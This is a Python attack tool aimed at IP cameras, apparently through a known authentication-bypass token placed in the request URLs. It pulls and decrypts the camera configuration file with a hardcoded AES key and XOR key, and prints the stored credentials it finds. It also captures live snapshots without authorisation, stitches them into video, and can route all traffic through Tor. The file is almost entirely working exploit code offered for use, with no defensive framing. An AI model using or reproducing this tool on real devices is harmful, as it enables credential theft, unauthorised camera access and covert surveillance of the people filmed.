import requests
import os
import struct
import sys
import time
import cv2
import numpy as np
from datetime import datetime
from skimage.metrics import structural_similarity as compare_ssim

# List of all users and their roles:
# http://camera.ip/Security/users?auth=YWRtaW46MTEK

# Camera snapshot:
# http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK

# Camera configuration:
# http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK

def log_error(error_message):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{current_time}] {error_message}")

def denoise_image(img):
    dst = cv2.fastNlMeansDenoising(img, None, 30, 7, 21)
    return dst

def are_images_similar(img1, img2, threshold=0.99):
    img1 = denoise_image(img1)
    img2 = denoise_image(img2)

    ssim_value, _ = compare_ssim(img1, img2, full=True)
    
    return ssim_value >= threshold

def decrypt_with_openssl(data):
    from subprocess import Popen, PIPE

    cmd = [
        "openssl", "enc", "-d", "-aes-128-ecb",
        "-K", "279977f62f6cfd2d91cd75b889ce0c9a",
        "-nosalt", "-md", "md5"
    ]
    process = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    decrypted_data, _ = process.communicate(input=data)
    return decrypted_data

def check_tor():
    try:
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=10)
        return True
    except requests.RequestException as e:
        log_error(f"Error checking Tor: {e}")
        return False


def images_to_video(img_folder, output_video):
    images = [img for img in os.listdir(img_folder) if img.endswith(".jpg")]
    
    images.sort()

    frame = cv2.imread(os.path.join(img_folder, images[0]))
    h, w, layers = frame.shape
    size = (w, h)

    out = cv2.VideoWriter(output_video, cv2.VideoWriter_fourcc(*'mp4v'), 1, size)

    for i in range(len(images)):
        img_path = os.path.join(img_folder, images[i])
        img = cv2.imread(img_path)
        out.write(img)

    out.release()


if len(sys.argv) not in [3, 4]:
    print("Usage: script.py -p|-s IP:PORT [-t]")
    sys.exit(1)

option = sys.argv[1]
ip, port = sys.argv[2].split(":")
use_tor = False

if '-t' in sys.argv:
    if not check_tor():
        print("Tor doesn't seem to be running or there's a problem with the connection. Exiting.")
        sys.exit(1)
    use_tor = True

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
} if use_tor else {}

if option == '-p':
    try:
        url = f"http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"
        response = requests.get(url, proxies=proxies)

        decrypted_output = decrypt_with_openssl(response.content)

        key = bytes([0x73, 0x8B, 0x55, 0x44])

        xor_output = bytearray()
        for i in range(len(decrypted_output)):
            xor_output.append(decrypted_output[i] ^ key[i % len(key)])

        offset1 = 0xA7BE0
        offset2 = 0xA7C00
        value1 = xor_output[offset1:offset1+16].decode(errors='ignore')
        value2 = xor_output[offset2:offset2+16].decode(errors='ignore')
        
        print(f"{ip}:{port}\t{value1}:{value2}")

    except requests.RequestException as e:
        log_error(f"Error fetching configuration file: {e}")


elif option == '-s':
    if not os.path.exists("snapshots"):
        os.mkdir("snapshots")

    directory = os.path.join("snapshots", f"{ip}:{port}")
    if not os.path.exists(directory):
        os.mkdir(directory)

    counter = 0
    last_saved_img_matrix = None 
    try:
        while True:
            response = requests.get(f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", proxies=proxies)

            if len(response.content) == 0:
                print(f"Warning: Received an empty image from {ip}:{port}. Skipping this frame.")
                continue

            current_img_matrix = cv2.imdecode(np.frombuffer(response.content, np.uint8), cv2.IMREAD_GRAYSCALE)
            
            if counter == 0 or (last_saved_img_matrix is None) or not are_images_similar(last_saved_img_matrix, current_img_matrix):
                filename = datetime.now().strftime("%Y%m%d_%H%M%S%f")[:-3] + ".jpg"
                file_path = os.path.join(directory, filename)
                with open(file_path, "wb") as file:
                    file.write(response.content)
                last_saved_img_matrix = current_img_matrix
            else:
                counter -= 1  

            counter += 1
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopped by user.")
    except requests.RequestException as e:
        log_error(f"Error fetching snapshot: {e}")
    
elif option == '-c':
    directory = os.path.join("snapshots", f"{ip}:{port}")
    if not os.path.exists(directory):
        print(f"No images found for {ip}:{port}")
        sys.exit(1)

    output_video = os.path.join("snapshots", f"{ip}_{port}.mp4")
    images_to_video(directory, output_video)
    print(f"Video saved as {output_video}")

else:
    print("Invalid option. Use -p, -s or -c.")
